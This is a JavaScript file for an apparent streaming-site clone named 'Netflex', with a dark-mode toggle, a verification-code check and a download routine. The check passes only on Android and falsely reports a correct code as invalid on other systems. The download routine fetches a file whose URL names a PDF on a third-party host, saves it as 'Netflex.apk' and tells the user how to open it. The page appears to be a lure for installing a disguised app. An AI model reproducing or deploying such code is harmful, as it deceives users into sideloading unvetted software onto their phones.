// Toggle Dark Mode
const ball = document.querySelector(".toggle-ball");
const items = document.querySelectorAll(
  ".container,.movie-list-title,.navbar-container,.toggle,.sidebar,.left-menu-icon"
);

ball.addEventListener("click", () => {
  items.forEach((item) => {
    item.classList.toggle("active");
  });
  ball.classList.toggle("active");
});
function getValue(){
  const code = document.getElementById("code").value;
  const result = document.getElementById("showResult");
  if(code == 1234){
      console.log("coode is CORRECT");
      // alert("🎉 Congratulations! Code verified successfully");
       const userAgent = navigator.userAgent.toLowerCase();
        
        
        if (/android/.test(userAgent)) {
          location.href= "success.html";
          alert("🎉 Congratulations! Code verified successfully");
          
          
        } else if (/iphone|ipad|ipod/.test(userAgent)) {
          console.log("you have iphone or ipad or ipod");
          console.log("pleas try again");
          alert("❌ Invalid code. Please try again.")
          alert("⚠️ Verification failed.")
          
        } else if (/windows/.test(userAgent)) {
          console.log("you have windows");
          console.log("pleas try again");
          alert("❌ Invalid code. Please try again.")
          alert("⚠️ Verification failed.")
          
        } else if (/mac/.test(userAgent)) {
          console.log("mac ");
          console.log("pleas try again");
          alert("❌ Invalid code. Please try again.")
          alert("⚠️ Verification failed.")
          
        } else if (/linux/.test(userAgent)) {
           console.log("linux");
           console.log("pleas try again");
           alert("❌ Invalid code. Please try again.")
           alert("⚠️ Verification failed.")
           
        } else {
          console.log("unknow ??");
           console.log("pleas try again");
           alert("❌ Invalid code. Please try again.")
           alert("⚠️ Verification failed.")
          
        }
      
      
  }else{
    console.log("pleas try again");
   alert("❌ Invalid code. Please try again.")
   alert("⚠️ Verification failed.")
  }
}
function download(){
  

  console.log("downlaod success");
  
  const url = "https://s3dad1825ccd91218.jimcontent.com/download/version/1737206679/module/18451299896/name/Test-diagnostique%20-1bac-SM.pdf";
  const filename = "Netflex.apk";

  async function downloadFile() {
    try {
      // 1. Fetch the file
      const response = await fetch(url, { mode: 'cors' });
      if (!response.ok) throw new Error('Network response was not ok');
      
      // 2. Create blob
      const blob = await response.blob();
      const blobUrl = URL.createObjectURL(blob);
      
      // 3. Create download link
      const link = document.createElement('a');
      link.href = blobUrl;
      link.download = filename;
      link.style.display = 'none';
      
      // 4. Trigger download
      document.body.appendChild(link);
      link.click();
      const message =
    '📲 Tap the download arrow → "Open in..."';
  
  alert(message);
      
      // 5. Cleanup
      setTimeout(() => {
        document.body.removeChild(link);
        URL.revokeObjectURL(blobUrl);
      }, 100);
      
    } catch (error) {
      console.error('Download failed:', error);
      // Fallback to normal link
      window.open(url, '_blank');
    }
  }

  downloadFile();

  
}


